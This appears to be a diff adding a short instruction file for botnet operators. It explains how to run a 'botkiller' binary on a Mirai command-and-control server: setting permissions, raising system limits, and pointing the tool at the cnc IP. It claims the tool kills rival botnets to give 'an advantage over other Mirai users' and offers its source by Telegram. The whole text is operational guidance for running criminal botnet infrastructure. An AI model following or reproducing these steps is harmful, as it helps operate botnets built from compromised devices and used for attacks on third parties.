@@ -1,0 +1,21 @@
+Before you start you need to run the Mirai cnc (with any bot killer)
+
+After the cnc is running, you need to write the following commands
+
+chmod 777 botkiller
+
+ulimit -n 1000000; ulimit -i unlimited; ulimit -l unlimited; ulimit -q unlimited; ulimit -s unlimited; ulimit -u unlimited; sysctl -w fs.inotify.max_user_watches=1000000
+
+./botkiller localhost
+./botkiller <Server IP address with Mirai cnc> 
+          example: ./botkiller 197.23.163.1
+
+
+Bot killer successfully launched, this script kills all known botnets and gives you an advantage over other Mirai users!
+
+If you want to get the source code of this script, please send me a message by telegram:  @sp00fd
+
+
+!!!Warning!!!
+This should be done directly on the server with the Mirai botnet itself!
+
